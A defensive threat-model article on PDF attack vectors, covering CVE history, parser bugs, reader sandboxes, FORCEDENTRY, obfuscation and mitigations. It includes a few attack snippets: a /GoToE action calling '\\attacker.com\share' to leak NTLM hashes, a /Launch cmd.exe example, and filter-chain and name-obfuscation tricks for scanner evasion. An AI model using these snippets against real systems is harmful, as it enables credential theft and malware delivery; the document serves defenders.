# PDF attack vectors: A comprehensive threat model

The PDF format represents one of computing's most sophisticated and enduring attack surfaces, responsible for some of history's most technically advanced exploits. Since 2007, PDFs have served as primary vectors for nation-state operations, commercial spyware, and mass malware campaigns—culminating in NSO Group's FORCEDENTRY exploit, which Google Project Zero called "one of the most technically sophisticated exploits we've ever seen." This threat model systematically categorizes **all documented PDF attack surfaces**, from low-level parsing vulnerabilities through application-layer exploits to obfuscation techniques enabling evasion.

The PDF specification's **700+ pages** create an immense attack surface spanning image codecs, font parsers, JavaScript engines, 3D renderers, encryption systems, and digital signatures. Unlike simpler document formats, PDFs function as complete application containers supporting scripting, embedded files, network connections, and automated actions—each capability representing a distinct exploitation vector.

---

## Historical evolution reveals escalating sophistication

PDF exploitation has progressed through three distinct eras, each marked by increased technical complexity and exploitation difficulty.

### The JavaScript era (2007-2010) established PDFs as weaponized documents

**2007-2008** marked PDF's emergence as a serious attack vector. CVE-2007-5659 introduced multiple JavaScript buffer overflows in Adobe Reader 8.1.1, while **CVE-2008-2992** (util.printf stack buffer overflow) became the first widely exploited PDF vulnerability and a staple in every major exploit kit. By 2008, PDFs represented **29% of targeted attacks**, overtaking Microsoft Word.

**2009** saw explosive growth—PDFs comprised **49% of targeted attacks** and up to **80% of web-encountered exploits** by Q4. Critical vulnerabilities included:
- **CVE-2009-0658**: First major JBIG2 exploit, establishing image parser attack surfaces
- **CVE-2009-4324**: Doc.media.newPlayer() zero-day, actively exploited in the wild
- **CVE-2009-0927**: Collab.getIcon() buffer overflow, heavily used in exploit kits

### Sandbox introduction forced sophistication (2010-2019)

Adobe Reader X's **Protected Mode sandbox** (November 2010) marked a defensive turning point. Attackers responded with:
- Multi-stage exploitation chains combining PDF vulnerabilities with OS exploits
- **CVE-2010-2883**: CoolType.dll SING table buffer overflow, used in APT operations
- **CVE-2010-0188**: TIFF integer overflow, integrated into every major exploit kit

The **BlackHole Exploit Kit** (2010-2013) dominated the landscape, weaponizing CVE-2008-2992, CVE-2009-0927, CVE-2009-4324, and CVE-2010-0188. Its creator's arrest in October 2013 temporarily disrupted the ecosystem.

**2018** demonstrated modern chained exploitation: **CVE-2018-4990** (JPEG2000 double-free) was discovered in active espionage campaigns combined with **CVE-2018-8120** (Windows kernel privilege escalation), representing the first publicly documented PDF-to-kernel exploitation chain.

### Zero-click sophistication defines the current era (2020-2025)

**FORCEDENTRY (CVE-2021-30860)** represents the apex of PDF exploitation. This NSO Group exploit used a JBIG2 integer overflow to build a **Turing-complete virtual CPU** using 70,000+ segment commands—achieving arbitrary code execution without JavaScript. The exploit bypassed Apple's BlastDoor sandbox specifically designed to prevent such attacks.

Current threats remain severe:
- **CVE-2023-26369**: Adobe Reader zero-day exploited in the wild (attributed to North Korea)
- **76% of email-based malware campaigns** leverage PDF attachments (Palo Alto Networks, 2024)
- **1 in 10 malicious email attachments** is a PDF (Barracuda Networks)

---

## Technical attack surface taxonomy

PDF's attack surface divides into **eight primary categories**, each containing multiple vulnerability classes.

### 1. Font parsing vulnerabilities provide powerful exploitation primitives

Font handling represents one of PDF's most dangerous attack surfaces due to complex parsing logic and the powerful memory corruption primitives font bugs typically provide.

**Adobe CoolType library** vulnerabilities are particularly severe. The library's 20KB+ Charstring interpreter supports every Type 1/Type 2 feature ever specified, including deprecated Multiple Masters functions. Critical vulnerabilities include:

| CVE | Year | Root Cause | Primitive Achieved |
|-----|------|------------|-------------------|
| **CVE-2010-2883** | 2010 | SING table strcat overflow | Stack corruption, widely exploited |
| **CVE-2015-3052** | 2015 | BLEND operator missing bounds check | Arbitrary stack read/write |
| **CVE-2023-26369** | 2023 | EBDT bitmap glyph merging | OOB heap write, exploited ITW |

The **BLEND vulnerability** (CVE-2015-0093/CVE-2015-3052) deserves special attention: negative n parameter shifts operand stack pointer by up to ~2MB, enabling 100% reliable ROP chain construction entirely within PostScript Charstring programs.

**FreeType library** affects open-source ecosystem broadly:
- **CVE-2025-27363**: Current actively-exploited zero-day in variable font subglyph parsing (CISA KEV listed)
- **CVE-2020-15999**: Chrome/FreeType zero-day exploited alongside Windows kernel bug
- Affects Linux desktops, Android, Chrome, Firefox, Poppler-based readers, MuPDF

### 2. Image decoder exploits enable zero-click attacks

Image codecs represent the attack surface enabling JavaScript-free exploitation, most dramatically demonstrated by FORCEDENTRY.

**JBIG2 vulnerabilities** are uniquely dangerous because the format's refinement coding supports logical operations (AND, OR, XOR, XNOR) between memory regions, making it computationally expressive:
- **CVE-2021-30860 (FORCEDENTRY)**: Integer overflow enabled heap corruption; JBIG2 logic operations built virtual CPU
- **CVE-2009-0658**: First major JBIG2 exploit, established image parser attack surface
- **CVE-2022-38171/38784**: Same integer overflow pattern affecting Xpdf, Poppler

**JPEG2000/OpenJPEG** has accumulated **99+ CVEs** on MITRE, making it exceptionally vulnerability-prone:
- **CVE-2016-8332**: MCC record parsing heap overflow enabling code execution
- **CVE-2018-4990**: Double-free used in active espionage campaign
- Affects PDFium (Chrome), Poppler, MuPDF, Adobe Reader

Library-level vulnerabilities propagate across readers:
- **OpenJPEG** → Chrome PDFium, Poppler, MuPDF
- **libtiff** → PDF generators, document processing systems
- **jbig2dec** → Ghostscript, MuPDF, Poppler
- **libpng** → Nearly all PDF readers and image processing

### 3. JavaScript engines present rich exploitation opportunities

Each major PDF reader implements JavaScript differently, creating distinct attack surfaces.

**Adobe Reader's SpiderMonkey-based engine** (EScript.api) uses Mozilla SpiderMonkey 1.8 (circa 2009), accumulating years of unpatched engine bugs:
- **CVE-2020-9715**: ESObject cache encoding mismatch causes use-after-free
- **CVE-2014-0521**: Property getter/setter abuse enables privilege escalation
- **CVE-2008-2992**: util.printf() stack buffer overflow—first widely exploited PDF CVE

Dangerous JavaScript APIs that have been exploited include:
- `Collab.collectEmailInfo()`, `Collab.getIcon()` – Buffer overflows
- `util.readFileIntoStream()` – Local file exfiltration when privileged
- `this.submitForm()` – Data exfiltration primitive

**Foxit Reader uses Google V8** but has shipped outdated versions (v7.7.299.6 from August 2019 discovered by SEC Consult), making it vulnerable to public Chrome exploits:
- **CVE-2020-15638/CVE-2020-6418**: V8 type confusion exploitable in PDF context
- **CVE-2024-28888**: Use-after-free in checkbox handling (CVSS 8.8)

**FormCalc scripting** (XFA forms) enables **same-origin requests with browser session cookies**—effectively providing cross-site request capability from PDF documents, killing CSRF protection for any website hosting user-uploaded PDFs.

### 4. PDF structure parsing creates parser differential attacks

PDF's specification ambiguities enable attacks exploiting differences between readers' interpretations.

**Cross-reference (XRef) table vulnerabilities** are critical because XRef tables map all object locations:
- **CVE-2020-6113**: Integer overflow in object stream size calculation (Nitro Pro)
- Malformed XRef handling causes infinite loops (CVE-2010-0207), heap overflows

**Parser differential attacks** exploit different readers producing different parse trees from identical input:
- Comment injection breaks extractors but not renderers
- Name obfuscation: `/OpenAction` → `/Open#41ction`
- Research demonstrated **100% evasion** of tested JavaScript extractors and commercial AV products

**Signature bypass attacks** (Ruhr University Bochum research) demonstrated three devastating classes:
- **Universal Signature Forgery (USF)**: Remove /ByteRange entry, signature still displays valid
- **Shadow Attacks**: Inject invisible content before signing, reveal after—**16 of 29 PDF applications vulnerable**
- **Incremental Saving Attack (ISA)**: Append content after signing via incremental updates

### 5. Actions and embedded content enable direct code execution

PDF actions represent the most direct attack vectors, enabling automatic execution without memory corruption.

**Dangerous action types** include:

| Action | Capability | Exploitation |
|--------|-----------|--------------|
| **/Launch** | Execute applications/files | `cmd.exe /c malicious_command` |
| **/URI** | Open URLs | Phishing, network callbacks |
| **/GoToR**, **/GoToE** | Load remote resources | NTLM hash theft via SMB (CVE-2018-4993) |
| **/SubmitForm** | POST form data | Silent data exfiltration |
| **/JavaScript** | Execute JavaScript | Full scripting attack surface |

**NTLM credential theft** (CVE-2018-4993) is particularly dangerous:
```
/S /GoToE /F (\\attacker.com\share\dummy.pdf)
```
This zero-click attack triggers automatic NTLM authentication when PDF opens, leaking hashes for offline cracking or relay attacks. All Windows PDF viewers were initially vulnerable.

**U3D/3D content parsing** continues generating vulnerabilities:
- **CVE-2011-2462**: CVSS 10.0, exploited by Sykipot APT, CISA KEV listed
- **CVE-2025-0910, CVE-2025-6644, CVE-2025-6647**: Recent out-of-bounds and use-after-free vulnerabilities

### 6. Encryption and signature weaknesses undermine document security

**PDFex attacks** (Ruhr University Bochum, 2019) demonstrated fundamental encryption weaknesses:
- PDF uses AES-CBC without authentication—no integrity protection
- **23 of 27 viewers** vulnerable to direct exfiltration attacks
- **ALL 27 viewers** vulnerable to CBC gadget attacks
- Attackers can exfiltrate decrypted content via forms/JavaScript without knowing encryption key

---

## Reader-specific attack surfaces differ dramatically

Each PDF reader presents a unique security posture based on architecture, sandboxing, and feature set.

### Adobe Acrobat/Reader: Most complex, most targeted

**Architecture**: Protected Mode sandbox (since 2010) + Windows AppContainer integration. Dual-process model with sandboxed renderer and privileged broker.

**Unique attack surface elements**: JavaScript engine (EScript.api), 3D engine, form handling, digital signatures, extensive plugin architecture. Has accumulated **hundreds of CVEs** across all categories.

**Notable exploitation**: 2013 first sandbox escape; 2018 zero-day chain with Windows kernel exploit; continuous APT targeting.

### Chrome PDFium: Strong sandbox, limited features

**Architecture**: Inherits Chrome's robust multi-process sandbox (seccomp-bpf, Win32k lockdown). No JavaScript execution for PDF content.

**Vulnerability pattern**: Primarily image codec issues (OpenJPEG, TIFF parsing). Exploitation requires separate Chrome sandbox escape for system compromise.

### Apple Preview/CoreGraphics/ImageIO: System-wide exposure

**Critical characteristic**: ImageIO framework processes images system-wide (Photos, Safari, Messages, AirDrop, Mail). **No dedicated PDF sandbox**.

**Zero-click exposure**: Images auto-process in Messages, AirDrop—FORCEDENTRY exploited this path.
- **CVE-2025-43300**: Current zero-day exploited in wild, JPEG Lossless decoder for DNG files

### Firefox PDF.js: Unique JavaScript-based architecture

**Architecture**: Pure JavaScript implementation using HTML5 Canvas—**no native code** means no traditional memory corruption.

**Attack surface shift**: XSS/code injection becomes primary threat rather than buffer overflows:
- **CVE-2024-4367**: Font glyph handling enables arbitrary JavaScript execution—affects "potentially millions of websites" embedding PDF.js
- On Electron apps without proper sandboxing, leads to native code execution

### MuPDF/SumatraPDF: Minimal features provide implicit protection

**Security advantage**: No JavaScript execution makes most sophisticated PDF exploits impossible. Not affected by attacks requiring scripting.

**Weakness**: No built-in sandbox; SumatraPDF has historically used outdated MuPDF versions (4+ years behind).

---

## Exploitation chains combine multiple primitives

Modern PDF exploitation typically requires chaining multiple vulnerabilities to achieve reliable code execution on hardened systems.

### The FORCEDENTRY chain demonstrates state-level capability

1. **Initial corruption**: Integer overflow in JBIG2Stream::readTextRegionSeg() causes undersized buffer allocation
2. **Heap grooming**: Corrupts adjacent GList backing buffer, then JBIG2Bitmap object fields
3. **Unbounded canvas**: Corrupted bitmap dimensions enable out-of-bounds read/write
4. **Virtual CPU construction**: 70,000+ JBIG2 segments create Turing-complete computation using logical operations
5. **Sandbox escape**: Bootstrapped code builds fake Objective-C objects to trigger NSPredicate/NSExpression evaluation

### Standard exploitation patterns

**Memory corruption → arbitrary read/write → code execution**:
1. Trigger vulnerability (heap overflow, UAF, type confusion)
2. Corrupt ArrayBuffer.byteLength to 0xffffffff via heap feng shui
3. Use corrupted buffer for arbitrary memory access
4. Leak module base addresses for ASLR bypass
5. Construct ROP chain targeting VirtualProtect/mprotect
6. Execute shellcode

**Sandbox escape requirements**:
- Adobe Reader: Exploit broker process or chain with Windows kernel vulnerability
- Chrome PDFium: Requires separate Chrome sandbox escape (typically IPC or kernel bug)
- Most other readers: No sandbox to escape

---

## Obfuscation techniques evade detection

Attackers employ sophisticated techniques to bypass security scanning.

### Filter chain abuse achieves highest evasion

Multiple encoding layers make content unreadable to scanners:
```
/Filter [/FlateDecode /ASCIIHexDecode /ASCII85Decode]
```

**JBIG2Decode abuse** is particularly effective—encoding arbitrary data as 1-dimensional monochrome images causes most scanners to fail decoding. Research found only **13 of 42 AV vendors** detected samples using cascaded filter obfuscation.

### Polyglot files defeat file type identification

PDF's tolerance for header offset (up to 1024 bytes) enables dual-format files:
- **PDF+MHT (MalDoc in PDF)**: Opens as Word with macros when extension changed
- **PDF+ZIP**: Both formats functional from same file
- **PDF+HTA**: Script execution via mshta.exe

Academic research demonstrated **0% detection rate** against some commercial endpoint tools.

### Parser differential techniques exploit implementation variations

- Different readers interpret malformed constructs differently
- Name obfuscation (`/Open#41ction`) bypasses string matching
- Shadow attacks hide/reveal content without invalidating signatures
- Research achieved **100% evasion** of tested JavaScript extractors

---

## Nation-state and commercial threat landscape

### APT groups actively weaponize PDF vulnerabilities

**Chinese APT groups** (Mustang Panda, APT10, Earth Estries) use PDF-themed lures and document-based initial access extensively, targeting ASEAN entities, telecommunications, and government organizations.

**Russian APT groups** (APT28, APT29, ColdRiver) employ PDF attachments with malicious links, "encrypted PDF" social engineering requiring fake decryptors, and document-themed spear-phishing targeting NATO, EU, and Ukrainian entities.

**North Korean APT groups** (Lazarus, Kimsuky, APT37) leverage PDF/document vectors including:
- Unicode character masquerading (files appearing as .pdf actually .exe)
- LNK files with PDF icons (forceCopy campaign)
- Coordinated operations targeting South Korean defense contractors

### Commercial spyware dominates zero-day discovery

**NSO Group's** evolution demonstrates increasing sophistication:
- 2016: One-click SMS phishing
- 2019: WhatsApp zero-click (1,400+ phones in two weeks)
- 2021: FORCEDENTRY (bypassing BlastDoor)
- 2023: BLASTPASS, three new iOS zero-click chains

**Market statistics** (Google TAG): Commercial spyware vendors attributed to **50% of all zero-day exploits discovered** and **64% of mobile/browser zero-days**.

**Pricing** reflects difficulty: iOS zero-click full chains command **$2-7 million** from exploit brokers; Android zero-click chains reach **$2.5-5 million**.

---

## MECE threat model summary

### Primary attack categories (Level 1)

| Category | Attack Surface | Representative CVEs | Severity |
|----------|---------------|---------------------|----------|
| **Font Parsing** | TrueType, Type1, CFF, FreeType | CVE-2023-26369, CVE-2015-3052, CVE-2010-2883 | Critical |
| **Image Codecs** | JBIG2, JPEG2000, PNG, TIFF | CVE-2021-30860, CVE-2018-4990, CVE-2016-8332 | Critical |
| **JavaScript Engines** | SpiderMonkey, V8, MuJS, FormCalc | CVE-2020-9715, CVE-2020-15638, CVE-2024-4367 | Critical |
| **PDF Structure/Parsing** | XRef, streams, signatures | CVE-2020-6113, Shadow attacks (CVE-2020-9592) | High |
| **Actions/Embedded Content** | Launch, URI, U3D, Flash | CVE-2018-4993, CVE-2011-2462, CVE-2011-0611 | High-Critical |
| **Encryption/Signatures** | AES-CBC weakness, signature bypass | PDFex attacks, USF/ISA/SWA variants | High |
| **Reader-Specific** | Application architecture, plugins | Reader-dependent | Variable |
| **Obfuscation/Evasion** | Filter chains, polyglots, parser differentials | N/A (technique-based) | Enables other attacks |

### Defense priorities

1. **Disable JavaScript** in PDF readers when not required
2. **Update readers promptly**—many vulnerabilities remain unpatched in older versions
3. **Block dangerous actions** (/Launch, /GoToR, /GoToE) via policy
4. **Strip untrusted content** at email gateways using CDR (Content Disarm and Reconstruction)
5. **Use readers with robust sandboxing** (Chrome, Edge, Adobe Protected Mode)
6. **Block outbound SMB** at firewall level to prevent NTLM theft
7. **Host user-uploaded PDFs on separate domains** to prevent same-origin attacks via FormCalc

PDF's combination of specification complexity, feature richness, and universal trust ensures it will remain a premier attack vector. The progression from simple buffer overflows to FORCEDENTRY's virtual CPU demonstrates that creative attackers will continue finding novel exploitation paths regardless of defensive improvements.